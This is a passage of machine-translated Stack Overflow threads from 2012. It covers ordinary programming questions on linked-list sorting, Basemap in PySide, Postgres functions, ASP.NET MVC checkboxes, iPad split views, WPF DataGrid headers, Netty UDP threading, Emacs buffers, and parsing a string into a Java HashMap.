只要您只有一个线程访问您的文档，并且只要您只为您的数据打开一个文档，您实际上不需要保存，它会在该上下文中自动保存。需要保存才能将更改从该上下文推送到另一个上下文（UIManagedDocument 有两个）并最终推送到云和其他设备。您的 completionHandler 中有两层 performBlock，这可能会使事情复杂化，并导致多个线程可能以不可预测的顺序同时访问您的数据库的情况。当我完成所有预加载和设置时，它只是在 completionHandler 中按顺序进行，然后是相当于你的 opendatabaseAndUseBlock 并且它永远不会崩溃。

# algorithm - 使用已排序和反向排序的备用元素对链表进行排序

> ID：10514442
> 
> 赞同：0
> 
> 时间：2012-05-09T10:42:00.210
> 
> 标签：algorithm, sorting, data-structures, linked-list

我在一次采访中被问到这个问题。

列表看起来像这样。

a [1] ->b [n] ->a [2] ->b [n-1] ... ->a [n] ->b [1] ->NULL

这样，a [1] < a [2] < ... < a [n]

和

b [1] < b [2] < ... < b [n]

面试官对我施加了以下限制：

1.  您必须对列表进行适当的排序，即不允许将一组元素的备用元素删除到单独的列表中。
2.  您必须以某种方式利用列表中的模式，而不是简单的排序算法。

在面试期间我无法想出解决方案，现在也是。:-(

编辑：用 C 编写代码来对这个单链表进行排序。

Edit2：有人告诉我，我可以从冒泡排序中借鉴一些想法并利用该模式。但它不应该是一个“幼稚”的短片。

我讨厌面试官施加人为限制，但嘿，工作就是工作:-)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-09T10:51:34.100

“你必须对列表进行适当的排序”这个要求让我感到困惑。我原以为自然的解决方案是：

*   通过抖动列表中的“下一个”指针，创建两个列表。一个包含a，另一个包含b，颠倒过来。
*   在这两个列表上进行合并。

但我不确定第一步是否违反规则。正如我所理解的那样，它*是*“就地”，因为它不会复制节点或其数据，实际上它也不会移动任何数据。但它*确实*将替代元素删除到单独的列表中。

我无法立即想到如何将这两个步骤组合成一个通道。

[编辑：也许这里的“就地”意味着我们*应该*移动数据，而不是重新链接列表。在这种情况下，我认为问题更难：有效的就地合并排序在数组中已经足够痛苦了，而无需尝试（a）在链表上执行此操作，（b）使用错误顺序的替代元素]

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-09T13:25:51.873

为了保持它“就地”，您可以先将列表就地转换为

a [1] -> ... -> a [n] -> b [1] -> ... -> b [n]

通过遍历列表并将 b 元素一一移动到列表的末尾。

[在此之后，您可以以“冒泡排序方式”将 a 元素一个接一个地向前移动，即向前扫描，直到在最初位于 b 1]之前的边界之后找到它们的位置。

但是我同意这个问题是相当人为的。

# matplotlib - mpl_toolkits.basemap 未正确调整大小

> ID：10514444
> 
> 赞同：0
> 
> 时间：2012-05-09T10:42:04.203
> 
> 标签：matplotlib, pyqt4, pyside

我在嵌入式 pyside 窗口中有一张来自 mpl_toolkits.basemap 的地图。当我调整窗口大小或使用 NavigationToolbar 中的缩放/平移按钮时，背景未正确更新。

这可能是什么原因？

当前代码是：

```
class geoDialog(QtGui.QDialog, Ui_mplDialog):
    def __init__(self, parent=None):
        super(geoDialog, self).__init__(parent)
        # Basic preparation for an embedded matplotlib
        self.setupUi(self)
        #self.fig = Figure(figsize=(600,600), dpi=72, facecolor=(1,1,1), edgecolor=(1,1,1))
        #self.fig = Figure(figsize=(5,8), dpi=72)
        self.fig = Figure()
        #self.setFixedSize(600, 600)
        #fig.set_picker(picker)
        self.canvas = FigureCanvas(self.fig)
        #self.verticalLayoutExtra = QtGui.QVBoxLayout()
        self.verticalLayout.addWidget(self.canvas)  
        #self.verticalLayoutExtra.addWidget(self.canvas)

        #self.ax = self.fig.add_axes([0.125,0.175,0.75,0.75]) #, axisbg='0.3')
        self.ax = self.fig.add_axes([0,0,1,1])
        self.ax.set_title('Geographical data')

        self.fig.set_frameon(False)
        #fig.set_alpha(self, alpha)

        #self.canvas.setSizePolicy(QtGui.QSizePolicy.Expanding,
        #                          QtGui.QSizePolicy.Expanding)
        #self.canvas.updateGeometry()

        #from matplotlib.pyplot import Scatter

        self.navigation_toolbar = NavigationToolbar(self.canvas, self)
        self.verticalLayout.addWidget(self.navigation_toolbar, 0)

        from mpl_toolkits.basemap import Basemap
        from geopy import geocoders

        #Draw cities
        gn = geocoders.Google()
        lats = []
        lons = []
        cities = []
        allEntities = session.query(Entity).all()
        #cities = ['Goirle, 5051','Neder Horst, 1394' , 'New Castle, NE1']
        for e in allEntities:
            if e.entityCity is not None:
                cities.append(str(e.country + ", " + e.entityCity + ", " + e.entityZipCode))

        for city in cities:
            print city
            place, (lat, lng) = gn.geocode(city)
            lats.append(lat)
            lons.append(lng)

        if len(cities) > 0:      
            llcrnrlatMin = min(lats) - 5
            urcrnrlatMax = max(lats) + 5
            llcrnrlonMin = min(lons) - 5
            urcrnrlonMax = max(lons) + 5

            ratio = (urcrnrlonMax - llcrnrlonMin) / (urcrnrlatMax - llcrnrlatMin) 
            print ratio, urcrnrlonMax, llcrnrlonMin, urcrnrlatMax, llcrnrlatMin
            if ratio > 1:
                urcrnrlatMax = urcrnrlatMax * (1 + (ratio - 1)/2)
                if urcrnrlatMax > 70: urcrnrlatMax = 70
                if urcrnrlatMax < -70: urcrnrlatMax = -70
                llcrnrlatMin = llcrnrlatMin * (1 - (ratio - 1)/2)
                if llcrnrlatMin > 70: llcrnrlatMin = 70
                if llcrnrlatMin < -70: llcrnrlatMin = -70
            else:
                urcrnrlonMax = urcrnrlonMax * (1 + (ratio - 1)/2)
                if urcrnrlonMax > 180: urcrnrlonMax = 179
                if urcrnrlonMax < -180: urcrnrlonMax = -179
                llcrnrlonMin = llcrnrlonMin * (1 - (ratio - 1)/2)
                if llcrnrlonMin > 180: llcrnrlonMin = 179
                if llcrnrlonMin < -180: llcrnrlonMin = -179
        else:
            llcrnrlatMin = 30
            urcrnrlatMax = 65
            llcrnrlonMin = -20
            urcrnrlonMax = 40     

        print urcrnrlonMax, llcrnrlonMin, urcrnrlatMax, llcrnrlatMin
        self.m = Basemap(projection='merc', llcrnrlat=llcrnrlatMin, urcrnrlat=urcrnrlatMax, \
                    llcrnrlon=llcrnrlonMin, urcrnrlon=urcrnrlonMax, resolution='i', ax=self.ax)        

        self.m.drawcoastlines()
        self.m.drawcountries()
        self.m.drawstates()
        self.m.fillcontinents(color='coral', lake_color='aqua')

        if len(cities) > 0:
            x,y = self.m(lons, lats)
            print x, y

            self.m.plot(x, y, 'bo', picker = True)
            # plot the names of those five cities.
            for name, xpt, ypt in zip(cities,x,y):
                self.ax.text(xpt+5000,ypt+5000,name)              

        self.m.drawmapboundary(fill_color='aqua') 
        self.updatesEnabled()

    def resizeEvent(self, event):
        print "resize"     
        #self.update()
        #self.canvas.update()
        frame.environmentGeneral_tab.setBackgroundRole(QPalette.Window)
        self.setBackgroundRole(QPalette.Window)
        self.update() 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-17T19:18:35.407

试试下面的例子。我认为它可以满足您的需求。

```
from PyQt4.QtCore import *
from PyQt4.QtGui import *

import sys

from matplotlib.backends.backend_qt4agg import FigureCanvasQTAgg as FigureCanvas
from matplotlib.backends.backend_qt4agg import NavigationToolbar2QTAgg as NavigationToolbar
from matplotlib.figure import Figure

import numpy as np
from mpl_toolkits.basemap import Basemap
from datetime import datetime

class WorldMap( QDialog):
    def __init__( self, parent = None, flags=Qt.Window):        
        super( WorldMap, self ).__init__( parent, flags)

        self.resize(800, 600)
        self.gridLayout = QGridLayout(self)

        self.gridLayout.setObjectName("gridLayout")
        self.widgetPlot = QWidget()
        self.widgetPlot.setObjectName("widgetPlot")        
        self.figure = Figure()        
        self.axes = self.figure.add_subplot(111)
        self.canvas = FigureCanvas( self.figure )
        layout = QVBoxLayout()
        self.widgetPlot.setLayout(layout)
        layout.addWidget(self.canvas)        
        self.gridLayout.addWidget(self.widgetPlot, 0, 0, 1, 1)
        self.mpl_toolbar = NavigationToolbar(self.canvas, self, coordinates = False)
        self.gridLayout.addWidget(self.mpl_toolbar, 1, 0, 1, 1)        

        map = Basemap(projection='mill',lon_0=0, ax= self.axes)
        map.drawcoastlines()
        map.drawparallels(np.arange(-90,90,30),labels=[1,0,0,0])
        map.drawmeridians(np.arange(map.lonmin,map.lonmax+30,60),labels=[0,0,0,1])
        map.drawmapboundary(fill_color='aqua')
        map.fillcontinents(color='coral',lake_color='aqua')
        date = datetime.utcnow()
        CS=map.nightshade(date)
        self.canvas.draw()

def main():
    app = QApplication(sys.argv)    
    dialog = WorldMap(None)    
    sys.exit( dialog.exec_() )

if __name__ == "__main__":    
    main() 
```

# sql - 与更新 Postgres 文件夹中的表的日期转换相关的类型错误

> ID：10514449
> 
> 赞同：1
> 
> 时间：2012-05-09T10:42:29.697
> 
> 标签：sql, postgresql

在 Postgres 数据库中导入数据后，我运行一个函数来规范化来自 ODBC 源的一些数据。一个字段是日期，但它以 varchar 形式出现，对于某些行，它为空，因此当我尝试将其转换为日期类型时，它会失败。我意识到这并不重要，因为数据仅用于显示，但我需要它采用有用的格式，所以我找到了以下 SQL：

```
UPDATE "MyTable" SET "VisitDate" =  to_char( DATE("VisitDate"), 'DD Mon YYYY' )  WHERE "VisitDate" <> ''; 
```

如果我直接在 SQL 浏览器中运行它，这会起作用，但是当我执行该函数时，它会说：

```
ERROR:  table row type and query-specified row type do not match
DETAIL:  Table has type character varying at ordinal position 6, but query expects text. 
```

据我所知，这是因为该`to_char()`函数返回文本，但该字段是一个 varchar （并且考虑到它的内容是合乎逻辑的）所以我想也许我可以执行以下操作：

```
ALTER TABLE "MyTable" ALTER "VisitDate" TYPE "text";
UPDATE "MyTable" SET "VisitDate" =  to_char( DATE("VisitDate"), 'DD Mon YYYY' )  WHERE "VisitDate" <> '';
ALTER TABLE "MyTable" ALTER "VisitDate" TYPE varchar(12); 
```

当然，这在函数中不起作用，因为-据我所知-Postgres 在单个事务中运行整个事物，因此在 UPDATE 之前不会发生 ALTER 指令，因此会出现相同的错误。

如果我尝试使用`varchar( to_char( ...etc ))`它只会抱怨 varchar 函数的内容。

在下面的评论之后，我尝试在函数中仅包含该行并且它成功，如果我在函数中有所有表更改语句它成功，如果我有两个它失败。该函数的基本形式是这样的：

```
CREATE OR REPLACE FUNCTION at_ebc_alterscorescolumns() RETURNS void AS
$BODY$
ALTER TABLE "MyTable" ALTER "Postcode" TYPE varchar(10);
UPDATE "MyTable" SET "VisitDate" =  to_char( DATE("VisitDate"), 'DD Mon YYYY' )  WHERE "VisitDate" <> '';
$BODY$
LANGUAGE sql VOLATILE
COST 100; 
```

这让我想知道是否仅仅是不可能在单个函数中更改表和更改数据的情况。

我的问题是：如何更改字段的格式而不导致此错误？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-09T14:16:20.880

执行此操作时，我可以看到 PG 8.4 的错误：

```
create table foo(somedate text);

create function alter_foo() returns void as
$$
alter table foo alter somedate type varchar(10);
update foo set somedate = to_char(date(somedate),'DD Mon YYYY' );
$$
language sql;

select alter_foo(); 
```

函数调用失败并显示以下消息：

> 错误：表行类型和查询指定的行类型不匹配详细信息：表的类型字符在序号位置 1 处变化，但查询需要文本。上下文：SQL 函数“alter_foo”语句 2

简单的解决方法是选择`plpgsql`语言而不是`sql`语言。前者是程序性的，而后者更适合单行和自动内联候选的东西。我猜想sql语言处理器以某种方式预先解析查询，如果在函数执行期间更改数据类型，它会感到困惑。

无论如何，如果你这样声明：

```
create function alter_foo() returns void as
$$
 begin
   alter table foo alter somedate type varchar(10);
   update foo set somedate = to_char(date(somedate),'DD Mon YYYY' );
 end;
$$ language plpgsql; 
```

然后它似乎按预期工作。

# javascript - 在 MVC 3 中选中时复选框的值不正确

> ID：10514451
> 
> 赞同：0
> 
> 时间：2012-05-09T10:42:35.653
> 
> 标签：javascript, jquery, asp.net-mvc-3

我有一个非常奇怪的情况，我将复选框中的值发布到我的控制器，即使选中，它也不是真的！

我的视图模型的一部分：

```
public class BeslutIStortViewDTO
{
    public BeslutIStortDTO BeslutIStort { get; set; }
    public BeslutIStortListorDTO SelectListor { get; set; }
}

public class BeslutIStortDTO
{
    public int id { get; set; }
    public bool Ok { get; set; }
    ... other stuff
} 
```

我的部分观点：

```
<div id="colOk" class="kolumn_header">
    @Html.LabelFor(model => model.BeslutIStort.Ok)
    @Html.CheckBoxFor(model => model.BeslutIStort.Ok, new { @class = "rensa", tabindex = 5 })
</div> 
```

在传递给控制器​​的字符串中，当未选中该框时，一切似乎都正常：

```
BeslutIStort.Ok=false 
```

但！当我检查它时：

```
BeslutIStort.Ok=&BeslutIStort.Ok=false 
```

它在字符串中出现了两次，第一次没有值，其他的是`false`，所以都是错误的。我当然希望只有一个，而那个是`true`.

另一个有趣的发现是，在实际渲染的 html 中，复选框如下所示：

```
<input class="rensa" id="BeslutIStort_Ok" name="BeslutIStort.Ok" tabindex="5" type="checkbox" value="true" /><input name="BeslutIStort.Ok" type="hidden" value="false" /> 
```

它有一个隐藏的领域！

当我将值发布到服务器时，我使用 ajax 执行此操作，并且 data 参数定义如下：

```
data: $("#BisData").serialize(), 
```

我希望有人可以帮助我对此有所了解，并帮助我对我的控制器进行一些“真实”:-)

===已解决===事实证明，我有这样的javascript：

$(".rensa").val("");

这使复选框不起作用。我添加了这个：

$(".rensaCheckbox").attr("选中", false);

对于复选框，现在它可以工作了。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-09T12:34:09.010

它也不是那么奇怪..
首先你已经收到了两次值，`BeslutIStort.Ok=&BeslutIStort.Ok=false` 因为 Razor 引擎会自动在表单中放置一个具有相同名称和值 false 的隐藏字段，当你使用`@Html.CheckboxFor()`
它时，即使未选中复选框返回一个`false`值。

第二...您收到空值，因为您的输入（复选框）html 控件上没有值。如果您希望返回一个值，只需使用以下代码添加一个

```
<div id="colOk" class="kolumn_header">
    @Html.LabelFor(model => model.BeslutIStort.Ok)
    @Html.CheckBoxFor(model => model.BeslutIStort.Ok, new { @class = "rensa", tabindex = 5,value="true" })
</div> 
```

# ipad - splitview ipad之前的登录屏幕

> ID：10514455
> 
> 赞同：0
> 
> 时间：2012-05-09T10:42:51.763
> 
> 标签：ipad

将 spliviewController 添加为 rootviewcontroller 后，我需要提供一个登录 Viewcontroller

```
MasterVC *masterViewController = [[[MasterVC alloc] initWithNibName:@"MasterVC" bundle:nil] autorelease];
UINavigationController *masterNavigationController = [[[UINavigationController alloc] initWithRootViewController:masterViewController] autorelease] ;
masterNavigationController.navigationBar.barStyle=UIBarStyleBlackOpaque;
masterNavigationController.delegate=masterViewController;

Home *detailViewController = [[[Home alloc] initWithNibName:@"home" bundle:nil] autorelease];
UINavigationController *detailNavigationController = [[[UINavigationController alloc] initWithRootViewController:detailViewController] autorelease];
detailNavigationController.navigationBar.barStyle=UIBarStyleBlackOpaque;

self.splitViewController = [[[UISplitViewController alloc] init] autorelease];
self.splitViewController.viewControllers = [NSArray arrayWithObjects:masterNavigationController, detailNavigationController, nil];

 self.window.rootViewController=self.splitViewController;
    LoginVC *modalLoginView = [[[LoginVC alloc] initWithNibName:@"LoginVC" bundle:nil] autorelease];
[modalLoginView setModalPresentationStyle:UIModalPresentationFullScreen];
[self.splitViewController presentModalViewController:modalLoginView animated:NO];

[self.window makeKeyAndVisible];
return YES; 
```

但是没有显示登录视图。请帮助。在此先感谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-08T18:09:40.403

尝试在主视图或详细视图的 viewDidAppear 事件中呈现模态视图。显然 appDelegate 尝试做 UI 演示的东西还为时过早，因为还没有界面。

您还需要将 splitViewController 的视图作为子视图添加到您的窗口中。

```
[self.window addSubView:self.spliViewController.view]; 
```

# wpf - 绑定到数据视图时的 WPF 数据网格行标题

> ID：10514457
> 
> 赞同：0
> 
> 时间：2012-05-09T10:43:01.050
> 
> 标签：wpf, datagrid, styles

当我尝试将数据视图绑定到数据网格并尝试使其将第一行显示为行标题时，我遇到了问题。

我的数据网格如下所示：

```
<DataGrid DockPanel.Dock="Top" Margin="15,15" HorizontalAlignment="Left" Name="ReportDataGrid" CanUserSortColumns="False"  CanUserResizeColumns="False" CanUserReorderColumns="False" AutoGenerateColumns="True" CanUserResizeRows="False" IsReadOnly="True" HorizontalScrollBarVisibility="Auto" HeadersVisibility="All" Visibility="{Binding Path=ShowReportDataGrid}" SelectionMode="Single" SelectionUnit="Cell" ClipboardCopyMode="IncludeHeader">
    <DataGrid.CellStyle>
        <Style TargetType="DataGridCell">
            <Setter Property="Width" Value="48"></Setter>
                </Style>
                    </DataGrid.CellStyle>
                        <DataGrid.ColumnHeaderStyle>
                            <Style TargetType="DataGridColumnHeader">
                                <Setter Property="Background" Value="{StaticResource DataGrid_Style_Header}" />
                                <Setter Property="Foreground" Value="White" />
                                <Setter Property="Padding" Value="10,0,10,0"/>
                                <Setter Property="Width" Value="48"></Setter>
                            </Style>
                        </DataGrid.ColumnHeaderStyle>
                        <DataGrid.RowHeaderStyle>
                            <Style TargetType="DataGridRowHeader">
                                <Setter Property="Background" Value="{StaticResource DataGrid_Style_Header}" />
                                <Setter Property="Foreground" Value="White" />
                                <Setter Property="Padding" Value="10,0,10,0"/>
                                <Setter Property="Width" Value="48"></Setter>
                            </Style>
                        </DataGrid.RowHeaderStyle>
                    </DataGrid> 
```

这段代码发生的情况是数据网格插入一个行标题，然后将数据视图中的数据放在网格的其余部分，行标题为空。将数据视图的第一列添加到行标题的好的解决方案是什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-10T10:56:08.410

我最终用一种风格解决了这个问题，就像这样：

```
<DataGrid.CellStyle>
    <Style TargetType="DataGridCell">
        <Setter Property="Width" Value="48"></Setter>
            <Style.Triggers>
                <DataTrigger Binding="{Binding RelativeSource={RelativeSource Self}, Path=Column.DisplayIndex, Mode=OneWay}" Value="0">
                    <Setter Property="Background" Value="{StaticResource DataGrid_Style_Header}" />        
                    <Setter Property="Foreground" Value="White" />
                    <Setter Property="Width" Value="60"></Setter>
                    </DataTrigger>
                </Style.Triggers>
            </Style>
        </DataGrid.CellStyle> 
```

# multithreading - 在 Netty UDP 服务器中未同时执行的线程

> ID：10514469
> 
> 赞同：4
> 
> 时间：2012-05-09T10:43:42.827
> 
> 标签：multithreading, concurrency, udp, netty

我正在分析的代码使用 Netty NioDatagramChannelFactory 创建 UDP 服务器。它创建一个线程池：

```
ExecutorService threadPool = Executors.newCachedThreadPool(); 
```

然后是数据报通道、pipelineFactory & bootstrap：

```
int workerCount = 10;
DatagramChannelFactory datagramChannelFactory = new NioDatagramChannelFactory(threadPool, workerCount);
ChannelPipelineFactory pipelineFactory = new SNMPTrapsPipeLineFactory();

ConnectionlessBootstrap bootStrap = new ConnectionlessBootstrap(datagramChannelFactory);
bootStrap.setPipelineFactory(pipelineFactory);
bootStrap.bind(new InetSocketAddress(host, port)); 
```

在 pipelineFactory 中，getPipeline() 添加了自定义处理程序。

就像在： [UDP 消息的多线程处理中所说的那样](http://lists.jboss.org/pipermail/netty-users/2009-September/001342.html)

只有一个线程处理收到的消息。在日志中，线程名称显示为**New I/O datagram worker #1**，如：

2012-04-20 09:20:51,853 新的 I/O 数据报工作人员 #1'-'1 INFO [cemrshSNMPTrapsRequestHandler:42] messageReceived | 处理：V1TRAP[reqestID=0, ...]

我阅读了文档和这个条目：[Lot of UDP requests lost in UDP server with Netty](https://stackoverflow.com/questions/9637436/lot-of-udp-requests-lost-in-udp-server-with-netty)

然后我根据这些条目更改了一些代码。现在创建线程池：

```
int corePoolSize = 5;
ExecutorService threadPool = new OrderedMemoryAwareThreadPoolExecutor(corePoolSize, 1048576, 1048576); 
```

以及带有 ExecutionHandler 的 pipelineFactory：

```
ExecutionHandler executionHandler = new ExecutionHandler(threadPool);
ChannelPipelineFactory pipelineFactory = new SNMPTrapsPipeLineFactory(executionHandler); 
```

并且 getPipeline() 添加了如下所述的处理程序：

```
public class SNMPTrapsPipeLineFactory implements ChannelPipelineFactory {

    private ExecutionHandler executionHandler = null;

    public SNMPTrapsPipeLineFactory(ExecutionHandler executionHandler) { 
        this.executionHandler = executionHandler;
    }

    @Override
    public ChannelPipeline getPipeline() throws Exception {

        ChannelPipeline pipeline = Channels.pipeline();
        pipeline.addFirst("ExecutorHandler", executionHandler);

        // Here the custom handlers are added
        pipeline.addLast( ... )
    } 
```

现在，我在日志中得到了 4 个不同的线程名称。它们显示为**pool-2-thread-1**、**pool-2-thread-2**等...

例如：

2012-05-09 09:12:19,589 pool-2-thread-1 信息 [cemrshSNMPTrapsRequestHandler:46] messageReceived | 处理：V1TRAP[reqestID=0, ...]

但它们不是同时处理的。messageReceived() 下的处理必须在一个线程上完成，以便下一个线程处理下一条消息。我从不同的客户端向服务器发送了大量消息，并且我得到的日志不是交错的。我还尝试在 messageReceived() 中使用 Thread.sleep()，并确认了前面的内容。

我错过了什么吗？有没有办法用 Netty 实现真正的多线程 UDP 服务器？如何让不同的线程同时执行 messageReceived()？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-13T18:07:56.727

根据我的经验和对 UDP 的 Netty 的理解，只有一个线程处理 UDP 消息进行解码是正常的。由于 UDP 是无会话的，因此只有一个线程可以在一个 UDP 端口上接收数据并对其进行解码。

一旦您解码了数据并将其包装到缓冲区或特定的 java 对象中，您就可以将该对象放入将处理它的线程池（执行处理程序 -> 您的业务处理程序）。然后，一旦您将先前解码的数据释放到执行处理程序中，就可以解码 UDP 端口上即将出现的新数据。

您可以在创建 NioDatagramChannelFactory 时指定的池线程仅在您侦听多个端口上的数据时使用。每个端口只有一个线程有意义。即使您在该构造函数中指定了 100 个工作器，如果您配置了一个 UDP 端口，也只会使用一个。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-09T21:05:23.037

让我大吃一惊的一件事是，您将执行处理程序放在管道中的*首位*。我相信其意图是直到“应用程序”处理程序的整个管道应该由执行 IO*和*解码的 IO 线程执行。

因此，我会断言您首先要添加所有 SNMPTrap 解码处理程序，然后，当您有一个实际的 SNMPTrap 时，它会被移交给执行处理程序，该处理程序又将陷阱传递给陷阱的实际使用者做一些有用的事情。

```
@Override
public ChannelPipeline getPipeline() throws Exception {

    ChannelPipeline pipeline = Channels.pipeline(
         new SomethingSomethingDecoder(),
         new SNMPTrapDecoder(),
         executionHandler.
         snmpTrapConsumerHandler
    );
} 
```

至少，[ExecutionHandler](http://netty.io/docs/stable/api/org/jboss/netty/handler/execution/ExecutionHandler.html) javadoc中是这样显示的，以上是我对它的解释。

# emacs - 在最近的 Emacs 中的其他窗口中显示缓冲区

> ID：10514470
> 
> 赞同：5
> 
> 时间：2012-05-09T10:43:45.850
> 
> 标签：emacs, window, buffer

如何以编程方式在窗口中显示缓冲区`other than the current`，类似于 Emacs 的 grep 行为`next-error`。我希望它可以在最新的 Emacs 24.1 中工作。请注意，此逻辑最近在 Emacs 主干中进行了修改，并合并为`display-buffer`具有相当复杂的调用语义的单个函数。`display-buffer`即使在阅读了几次帮助之后，我也很难弄清楚它的用途。为什么没有这样的包装函数，例如`display-buffer-other-window`？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-09T11:07:01.340

The lengthy docstring to `display-buffer` includes the following:

> The ACTION argument to `display-buffer' can also have a non-nil and non-list value. This means to display the buffer in a window other than the selected one, even if it is already displayed in the selected window. If called interactively with a prefix argument, ACTION is t.

Therefore to display a specified buffer in a window other than the current, you can use:

```
(display-buffer BUFFER-OR-NAME t) 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-05-10T02:12:30.510

并且包装器存在，顺便说一句，它被称为`switch-to-buffer-other-window`.

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-05-09T10:56:37.480

Emacs 资源给了我答案

```
(pop-to-buffer BUFFER 'other-window) 
```

# java - 如何将字符串转换为 HashMap？

> ID：10514473
> 
> 赞同：33
> 
> 时间：2012-05-09T10:43:51.640
> 
> 标签：java, dictionary, hashmap

我有一个 Java 属性文件，并且有一个`KEY`as `ORDER`. 所以我在加载属性文件后使用该方法检索它`VALUE`，如下所示：`KEY``getProperty()`

```
String s = prop.getProperty("ORDER"); 
```

然后

```
s ="SALES:0,SALE_PRODUCTS:1,EXPENSES:2,EXPENSES_ITEMS:3"; 
```

我需要从上面的字符串创建一个 HashMap。`SALES,SALE_PRODUCTS,EXPENSES,EXPENSES_ITEMS`应该是`KEY`HashMap 并且`0,1,2,3,`应该是`VALUE`s 的`KEY`s。

如果它是硬线，它看起来像下面：

```
Map<String, Integer> myMap  = new HashMap<String, Integer>();
myMap.put("SALES", 0);
myMap.put("SALE_PRODUCTS", 1);
myMap.put("EXPENSES", 2);
myMap.put("EXPENSES_ITEMS", 3); 
```

* * *

## 回答 #1

> 赞同：67
> 
> 时间：2012-05-09T10:46:20.810

您可以使用[Guava 的](https://github.com/google/guava) [Splitter.MapSplitter](http://google.github.io/guava/releases/21.0/api/docs/com/google/common/base/Splitter.MapSplitter.html)做到这一点：

```
Map<String, String> properties = Splitter.on(",")
    .withKeyValueSeparator(":")
    .split(inputString); 
```

* * *

## 回答 #2

> 赞同：50
> 
> 时间：2012-05-09T10:46:55.863

使用[`String.split()`](https://docs.oracle.com/javase/8/docs/api/java/lang/String.html#split-java.lang.String-)带`,`分隔符的方法来获取对列表。迭代这些对并`split()`再次与`:`分隔符一起使用以获取每对的键和值。

```
Map<String, Integer> myMap = new HashMap<String, Integer>();
String s = "SALES:0,SALE_PRODUCTS:1,EXPENSES:2,EXPENSES_ITEMS:3";
String[] pairs = s.split(",");
for (int i=0;i<pairs.length;i++) {
    String pair = pairs[i];
    String[] keyValue = pair.split(":");
    myMap.put(keyValue[0], Integer.valueOf(keyValue[1]));
} 
```

* * *

## 回答 #3

> 赞同：27
> 
> 时间：2015-07-09T10:22:30.430

在一行中：

```
HashMap<String, Integer> map = (HashMap<String, Integer>) Arrays.asList(str.split(",")).stream().map(s -> s.split(":")).collect(Collectors.toMap(e -> e[0], e -> Integer.parseInt(e[1]))); 
```

*细节：*

1）拆分条目对并将字符串数组转换为`List<String>`以便使用`java.lang.Collection.Stream`API`Java 1.8`

```
Arrays.asList(str.split(",")) 
```

2) 将生成的字符串列表映射`"key:value"`到以[0]为键、[1]为值的字符串数组

```
map(s -> s.split(":")) 
```

3) 使用`collect`流 API 中的终端方法进行变异

```
collect(Collector<? super String, Object, Map<Object, Object>> collector) 
```

4）使用`Collectors.toMap()`静态方法，采用两个Function执行从输入类型到键值类型的突变。

```
toMap(Function<? super T,? extends K> keyMapper, Function<? super T,? extends U> valueMapper) 
```

其中 T 是输入类型，K 是键类型，U 是值类型。

5) 跟随 lambda 变化`String`为`String`键`String`和`Integer`值

```
toMap(e -> e[0], e -> Integer.parseInt(e[1])) 
```

**享受流和 lambda 风格`Java 8`。** ***没有更多的循环！***

* * *

## 回答 #4

> 赞同：6
> 
> 时间：2017-08-02T16:00:18.347

我建议使用`com.fasterxml.jackson.databind.ObjectMapper`（Maven repo 链接：[https](https://mvnrepository.com/artifact/com.fasterxml.jackson.core) ://mvnrepository.com/artifact/com.fasterxml.jackson.core ）喜欢

```
final ObjectMapper mapper = new ObjectMapper();
Map<String, Object> mapFromString = new HashMap<>();
try {
    mapFromString = mapper.readValue(theStringToParse, new TypeReference<Map<String, Object>>() {
        });
} catch (IOException e) {
    LOG.error("Exception launched while trying to parse String to Map.", e);
} 
```

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2012-05-09T10:48:01.060

假设没有键包含`','`or `':'`：

```
Map<String, Integer> map = new HashMap<String, Integer>();
for(final String entry : s.split(",")) {
    final String[] parts = entry.split(":");
    assert(parts.length == 2) : "Invalid entry: " + entry;
    map.put(parts[0], new Integer(parts[1]));
} 
```

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2012-05-09T11:42:21.457

使用 StringTokenizer 解析字符串。

```
String s ="SALES:0,SALE_PRODUCTS:1,EXPENSES:2,EXPENSES_ITEMS:3";
    Map<String, Integer> lMap=new HashMap<String, Integer>();

    StringTokenizer st=new StringTokenizer(s, ",");
    while(st.hasMoreTokens())
    {
        String [] array=st.nextToken().split(":");
        lMap.put(array[0], Integer.valueOf(array[1]));
    } 
```

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2015-06-19T14:50:57.257

您还可以使用 json.org 中的 JSONObject 类，这会将您的 HashMap 转换为格式正确的 JSON 字符串

例子：

```
Map<String,Object> map = new HashMap<>();
map.put("myNumber", 100);
map.put("myString", "String");

JSONObject json= new JSONObject(map);

String result= json.toString();

System.out.print(result); 
```

结果：

```
{'myNumber':100, 'myString':'String'} 
```

您也可以从中获取密钥，例如

```
System.out.print(json.get("myNumber")); 
```

结果：

```
100 
```

* * *

## 回答 #8

> 赞同：2
> 
> 时间：2021-01-08T12:17:27.013

**使用 Java 8：**

```
Map<String, String> headerMap = Arrays.stream(header.split(","))
                    .map(s -> s.split(":"))
                    .collect(Collectors.toMap(s -> s[0], s -> s[1])); 
```

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2012-05-09T10:48:52.380

您可以使用 split 来做到这一点：

```
 String[] elements = s.split(",");
 for(String s1: elements) {
     String[] keyValue = s1.split(":");
     myMap.put(keyValue[0], keyValue[1]);
 } 
```

不过，我自己会选择基于番石榴的解决方案。 [https://stackoverflow.com/a/10514513/1356883](https://stackoverflow.com/a/10514513/1356883)

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2012-05-09T10:53:50.930

尝试

```
 String s = "SALES:0,SALE_PRODUCTS:1,EXPENSES:2,EXPENSES_ITEMS:3";
    HashMap<String,Integer> hm =new HashMap<String,Integer>();
    for(String s1:s.split(",")){
       String[] s2 = s1.split(":");
        hm.put(s2[0], Integer.parseInt(s2[1]));
    } 
```

# java - 如何在 GWT 应用程序中发送电子邮件

> ID：10514479
> 
> 赞同：1
> 
> 时间：2012-05-09T10:44:18.957
> 
> 标签：java, google-app-engine, email, gwt

